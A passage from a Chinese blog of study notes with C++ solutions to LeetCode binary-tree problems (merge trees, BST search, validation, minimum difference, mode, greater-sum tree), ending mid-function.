<h3 id="617-合并二叉树"><a href="#617-合并二叉树" class="headerlink" title="617 合并二叉树"></a>617 合并二叉树</h3><p>给你两棵二叉树： root1 和 root2 。<br>想象一下，当你将其中一棵覆盖到另一棵之上时，两棵树上的一些节点将会重叠（而另一些不会）。<br>【将这两棵树合并成一棵新二叉树】<br><strong>合并的规则</strong>：如果两个节点重叠，那么将这两个节点的值相加作为合并后节点的新值；否则，不为 null 的节点将直接作为新二叉树的节点。<br>返回合并后的二叉树。<br><img src="https://img-blog.csdnimg.cn/50bdefd6f86b42548cbb2d80974420f4.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment">    O(min(m,n))</span></span><br><span class="line"><span class="comment">    O(min(m,n))</span></span><br><span class="line"><span class="comment">    空间复杂度取决于递归调用的层数，递归调用的层数不会超过较小的二叉树的最大高度，最坏情况下，二叉树的高度等于节点数。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buide</span><span class="params">(TreeNode* p1, TreeNode* p2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(p1 == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> p2;</span><br><span class="line">        <span class="keyword">if</span>(p2 == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> p1;</span><br><span class="line">        <span class="comment">//创建新结点</span></span><br><span class="line">        TreeNode *node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(p1-&gt;val+p2-&gt;val);</span><br><span class="line">        node-&gt;left = <span class="built_in">buide</span>(p1-&gt;left,p2-&gt;left);    </span><br><span class="line">        node-&gt;right = <span class="built_in">buide</span>(p1-&gt;right,p2-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">mergeTrees</span><span class="params">(TreeNode* root1, TreeNode* root2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">buide</span>(root1,root2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    迭代-队列</span></span><br><span class="line"><span class="comment">    这里注意：如果想要新建一颗完整的树 而不是 在题目给的两个树上进行修改，就必须单独给 新的树 建个队列</span></span><br><span class="line"><span class="comment">    这里共有 【两个队列】</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">mergeTrees</span><span class="params">(TreeNode* root1, TreeNode* root2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root1==<span class="literal">nullptr</span>)  </span><br><span class="line">            <span class="keyword">return</span> root2;</span><br><span class="line">        <span class="keyword">if</span>(root2==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> root1;</span><br><span class="line">        queue&lt;TreeNode*&gt; q;<span class="comment">//存 原始两个树中的结点，用于依次遍历</span></span><br><span class="line">        queue&lt;TreeNode*&gt; q_node;<span class="comment">//存建好的结点</span></span><br><span class="line">        q.<span class="built_in">push</span>(root1);</span><br><span class="line">        q.<span class="built_in">push</span>(root2);</span><br><span class="line">        TreeNode *node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(root1-&gt;val+root2-&gt;val);<span class="comment">//新建结点</span></span><br><span class="line">        q_node.<span class="built_in">push</span>(node);</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            TreeNode *node1 = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            TreeNode *node2 = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            TreeNode *root = q_node.<span class="built_in">front</span>();</span><br><span class="line">            q_node.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="comment">//TreeNode *node = new TreeNode(node1-&gt;val+node2-&gt;val);</span></span><br><span class="line">            <span class="keyword">if</span>(node1-&gt;left &amp;&amp; node2-&gt;left)&#123;</span><br><span class="line">                TreeNode *node_left = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(node1-&gt;left-&gt;val+node2-&gt;left-&gt;val);</span><br><span class="line">                root-&gt;left = node_left;<span class="comment">//连接左结点</span></span><br><span class="line">                q.<span class="built_in">push</span>(node1-&gt;left);</span><br><span class="line">                q.<span class="built_in">push</span>(node2-&gt;left);</span><br><span class="line">                q_node.<span class="built_in">push</span>(node_left);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(node1-&gt;left &amp;&amp; !node2-&gt;left)&#123;</span><br><span class="line">                root-&gt;left = node1-&gt;left;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!node1-&gt;left &amp;&amp; node2-&gt;left)&#123;</span><br><span class="line">                root-&gt;left = node2-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node1-&gt;right &amp;&amp; node2-&gt;right)&#123;</span><br><span class="line">                TreeNode *node_right = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(node1-&gt;right-&gt;val+node2-&gt;right-&gt;val);</span><br><span class="line">                root-&gt;right = node_right;<span class="comment">//连接右结点</span></span><br><span class="line">                q.<span class="built_in">push</span>(node1-&gt;right);</span><br><span class="line">                q.<span class="built_in">push</span>(node2-&gt;right);</span><br><span class="line">                q_node.<span class="built_in">push</span>(node_right);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(node1-&gt;right &amp;&amp; !node2-&gt;right)&#123;</span><br><span class="line">                root-&gt;right = node1-&gt;right;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!node1-&gt;right &amp;&amp; node2-&gt;right)&#123;</span><br><span class="line">                root-&gt;right = node2-&gt;right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="700-二叉搜索树中的搜索——典例"><a href="#700-二叉搜索树中的搜索——典例" class="headerlink" title="700 二叉搜索树中的搜索——典例"></a>700 二叉搜索树中的搜索——典例</h3><p>给定二叉搜索树（BST）的根节点和一个值。 你需要在BST中【找到节点值等于给定值的节点】。<br>返回以该节点为根的子树。 如果节点不存在，则返回 NULL。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">searchBST</span><span class="params">(TreeNode* root, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val &gt; val)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">searchBST</span>(root-&gt;left, val);</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val &lt; val)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">searchBST</span>(root-&gt;right, val);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">searchBST</span><span class="params">(TreeNode* root, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">while</span>(root &amp;&amp; root-&gt;val != val)&#123;<span class="comment">//这里是while</span></span><br><span class="line">            <span class="keyword">if</span>(root-&gt;val &gt; val)</span><br><span class="line">                root = root-&gt;left;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                root = root-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="98-验证二叉搜索树——典例"><a href="#98-验证二叉搜索树——典例" class="headerlink" title="98 验证二叉搜索树——典例"></a>98 验证二叉搜索树——典例</h3><p>给你一个二叉树的根节点 root ，判断其是否是一个有效的二叉搜索树。</p>
<p>有效 二叉搜索树定义如下：</p>
<pre><code>节点的左子树只包含 小于 当前节点的数。
节点的右子树只包含 大于 当前节点的数。
所有左子树和右子树自身必须也是二叉搜索树。
</code></pre>
<p><strong>误区：</strong><br>认为对于每颗树以及其子树来说，只要满足左&lt;根&lt;右，即可。如下面的代码是错误的。对于该例子就不符合。<br><img src="https://img-blog.csdnimg.cn/c041f29f9fa04b80955660b8dc59b115.png"><br>对于5这个结点来说，右边存在结点3，是错误的<br>但是代码只会判断 3比6小而认为其正确。<br><strong>方法：中序遍历下，输出的二叉搜索树节点的数值是有序序列。</strong><br><strong>还有个坑：还【不能存在相同元素】</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    1.中序遍历</span></span><br><span class="line"><span class="comment">    2.判断是否是递增，不能有重复</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; node;<span class="comment">//中序遍历 序列</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">traversal</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//中序遍历</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">            <span class="built_in">traversal</span>(root-&gt;left);<span class="comment">//左</span></span><br><span class="line">        node.<span class="built_in">push_back</span>(root-&gt;val);<span class="comment">//根</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">            <span class="built_in">traversal</span>(root-&gt;right);<span class="comment">//右</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValidBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">traversal</span>(root);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;node.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(node[i<span class="number">-1</span>]&gt;=node[i])<span class="comment">//如果序列不是递增的，则false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TreeNode* pre = <span class="literal">NULL</span>; <span class="comment">// 用来记录前一个节点</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValidBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">bool</span> left = <span class="built_in">isValidBST</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">if</span> (pre != <span class="literal">NULL</span> &amp;&amp; pre-&gt;val &gt;= root-&gt;val)   </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        pre = root; <span class="comment">// 记录前一个节点</span></span><br><span class="line">        <span class="keyword">bool</span> right = <span class="built_in">isValidBST</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> left &amp;&amp; right;<span class="comment">//左右子树都符号条件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//官方递归  【好理解】</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">helper</span><span class="params">(TreeNode* root, <span class="keyword">long</span> <span class="keyword">long</span> lower, <span class="keyword">long</span> <span class="keyword">long</span> upper)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//对于任意一个结点，它必须大于左结点，小于右结点</span></span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val&lt;=lower || root-&gt;val&gt;=upper)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(root-&gt;left, lower, root-&gt;val) &amp;&amp; <span class="built_in">helper</span>(root-&gt;right, root-&gt;val, upper);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValidBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(root, LONG_MIN, LONG_MAX);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代【中序遍历】  栈</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValidBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        TreeNode* cur = root;</span><br><span class="line">        TreeNode* pre = <span class="literal">NULL</span>; <span class="comment">// 记录前一个节点</span></span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="literal">NULL</span> || !st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cur != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                st.<span class="built_in">push</span>(cur);</span><br><span class="line">                cur = cur-&gt;left;   <span class="comment">//左</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur = st.<span class="built_in">top</span>();    <span class="comment">//中</span></span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (pre != <span class="literal">NULL</span> &amp;&amp; cur-&gt;val &lt;= pre-&gt;val)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                pre = cur; <span class="comment">//保存前一个访问的结点</span></span><br><span class="line">                cur = cur-&gt;right;   <span class="comment">//右</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="530-二叉搜索树的最小绝对差"><a href="#530-二叉搜索树的最小绝对差" class="headerlink" title="530 二叉搜索树的最小绝对差"></a>530 二叉搜索树的最小绝对差</h3><p>给你一棵【所有节点为非负值】的二叉搜索树，请你计算树中任意两节点的差的绝对值的最小值。<br><strong>思路：中序遍历是升序，则差最小值只可能 【结点相邻】</strong></p>
<ul>
<li><p>中序遍历一遍，求最小差值</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    先中序遍历 求得 升序序列</span></span><br><span class="line"><span class="comment">    再遍历序列，求 min</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; vec;<span class="comment">//记录中序遍历序列</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(TreeNode *root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">            <span class="built_in">inorder</span>(root-&gt;left);<span class="comment">//左</span></span><br><span class="line">        vec.<span class="built_in">push_back</span>(root-&gt;val);<span class="comment">//根</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">            <span class="built_in">inorder</span>(root-&gt;right);<span class="comment">//右</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getMinimumDifference</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">inorder</span>(root);</span><br><span class="line">        <span class="keyword">int</span> min = INT_MAX;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;vec.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> num = vec[i]-vec[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">if</span>(num &lt; min)</span><br><span class="line">                min = num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    在中序遍历时 就求min</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; vec;</span><br><span class="line">    <span class="keyword">int</span> res = INT_MAX;</span><br><span class="line">    TreeNode *pre = <span class="literal">nullptr</span>;<span class="comment">//记录前驱</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(TreeNode *root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">            <span class="built_in">inorder</span>(root-&gt;left);<span class="comment">//左</span></span><br><span class="line">        <span class="keyword">if</span>(pre)</span><br><span class="line">            res = <span class="built_in">min</span>(res,root-&gt;val-pre-&gt;val);<span class="comment">//更新最小值</span></span><br><span class="line">        pre = root;<span class="comment">//更新前驱</span></span><br><span class="line">        vec.<span class="built_in">push_back</span>(root-&gt;val);<span class="comment">//根</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">            <span class="built_in">inorder</span>(root-&gt;right);<span class="comment">//右</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getMinimumDifference</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">inorder</span>(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="501-二叉搜索树中的众数"><a href="#501-二叉搜索树中的众数" class="headerlink" title="501 二叉搜索树中的众数"></a>501 二叉搜索树中的众数</h3><p>给你一个含重复值的二叉搜索树（BST）的根节点 root ，找出并返回 BST 中的所有 众数【出现频率最高的元素】。<br>如果树中有不止一个众数，可以按 任意顺序 返回。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    自定义 sort【降序排序】</span></span><br><span class="line"><span class="comment">    在中序遍历时就 哈希</span></span><br><span class="line"><span class="comment">    常用技巧：map-&gt;vector</span></span><br><span class="line"><span class="comment">    vector&lt;pair&lt;int,int&gt;&gt; vec(maap.begin(),maap.end());</span></span><br><span class="line"><span class="comment">    sort(vec.begin(), vec.end(), cmp); //排序</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; nums;<span class="comment">//存结果</span></span><br><span class="line">    unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; maap;<span class="comment">//记录元素频率</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(TreeNode *root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">            <span class="built_in">inorder</span>(root-&gt;left);<span class="comment">//左</span></span><br><span class="line">        nums.<span class="built_in">push_back</span>(root-&gt;val);<span class="comment">//根</span></span><br><span class="line">        maap[root-&gt;val]++;<span class="comment">//哈希计数</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">            <span class="built_in">inorder</span>(root-&gt;right);<span class="comment">//右</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="keyword">static</span> <span class="title">cmp</span> <span class="params">(<span class="keyword">const</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&amp; a, <span class="keyword">const</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&amp; b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a.second &gt; b.second;<span class="comment">//降序</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">findMode</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">inorder</span>(root);</span><br><span class="line">        <span class="keyword">int</span> max = INT_MIN;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;<span class="comment">//结果集</span></span><br><span class="line">        <span class="comment">//把maap内容，放入vector&lt;pair&lt;int,int&gt;&gt;中</span></span><br><span class="line">        vector&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt; <span class="built_in">vec</span>(maap.<span class="built_in">begin</span>(), maap.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">sort</span>(vec.<span class="built_in">begin</span>(), vec.<span class="built_in">end</span>(), cmp); <span class="comment">// 给频率排个序</span></span><br><span class="line">        res.<span class="built_in">push_back</span>(vec[<span class="number">0</span>].first);<span class="comment">//前面是最大的</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; vec.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="comment">// 取最高的放到result数组中</span></span><br><span class="line">            <span class="keyword">if</span> (vec[i].second == vec[<span class="number">0</span>].second) </span><br><span class="line">                res.<span class="built_in">push_back</span>(vec[i].first);</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    优化：利用 cur和pre 两个一前一后指针，在中序遍历时就 找众数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> max = <span class="number">0</span>;<span class="comment">//最大频率</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;<span class="comment">//频率</span></span><br><span class="line">    TreeNode *pre = <span class="literal">nullptr</span>;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(TreeNode *cur)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(cur==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">inorder</span>(cur-&gt;left);<span class="comment">//左</span></span><br><span class="line">        <span class="keyword">if</span>(pre==<span class="literal">nullptr</span>)<span class="comment">//第一个结点</span></span><br><span class="line">            count = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(pre-&gt;val == cur-&gt;val)</span><br><span class="line">            count++;<span class="comment">//当前结点值 和 上一个节点值相同</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            count = <span class="number">1</span>;<span class="comment">//注意：容易忽略</span></span><br><span class="line">        pre = cur;<span class="comment">//更新pre</span></span><br><span class="line">        <span class="comment">// 如果和最大值相同，放进result中</span></span><br><span class="line">        <span class="keyword">if</span>(count == max)</span><br><span class="line">            res.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">        <span class="comment">//更新 最大值</span></span><br><span class="line">        <span class="keyword">if</span>(count &gt; max)&#123;</span><br><span class="line">            max = count;</span><br><span class="line">            res.<span class="built_in">clear</span>();<span class="comment">// 关键一步，不要忘记清空result，之前result里的元素都失效了</span></span><br><span class="line">            res.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">inorder</span>(cur-&gt;right);<span class="comment">//右</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">findMode</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">        max = <span class="number">0</span>;</span><br><span class="line">        TreeNode *pre = <span class="literal">nullptr</span>;</span><br><span class="line">        res.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="built_in">inorder</span>(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="538-把二叉搜索树转换为累加树"><a href="#538-把二叉搜索树转换为累加树" class="headerlink" title="538 把二叉搜索树转换为累加树"></a>538 把二叉搜索树转换为累加树</h3><p>给出二叉 搜索 树的根节点，该树的节点值各不相同，请你将其转换为累加树（Greater Sum Tree），使每个节点 node 的新值等于【原树中大于或等于 node.val 的值之和】。<br><img src="https://img-blog.csdnimg.cn/1acc0ed6893e4b00ba35cd1d73cb9818.png"></p>
<p>  中序遍历序列：0 1 2 3 4 5 6 7 8<br>  逆序过来进行遍历：8 7 6 5 4 3 2 1 0<br>  若每遍历一个结点，都用本结点值+前一个结点值<br>  【8 15 21 26 30 33 35 36 36】</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    按照后序遍历顺序，依次加</span></span><br><span class="line"><span class="comment">    中序遍历：左根右 是递增序列</span></span><br><span class="line"><span class="comment">    本题应该按照 该递增序列的【逆序列】，进行改值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TreeNode *pre = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">0</span>);<span class="comment">//记录前驱</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(TreeNode *root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">            <span class="built_in">postorder</span>(root-&gt;right);<span class="comment">//右</span></span><br><span class="line">        root-&gt;val += pre-&gt;val;</span><br><span class="line">        pre = root;<span class="comment">//更新前驱</span></span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">            <span class="built_in">postorder</span>(root-&gt;left);<span class="comment">//左</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">convertBST</span><span 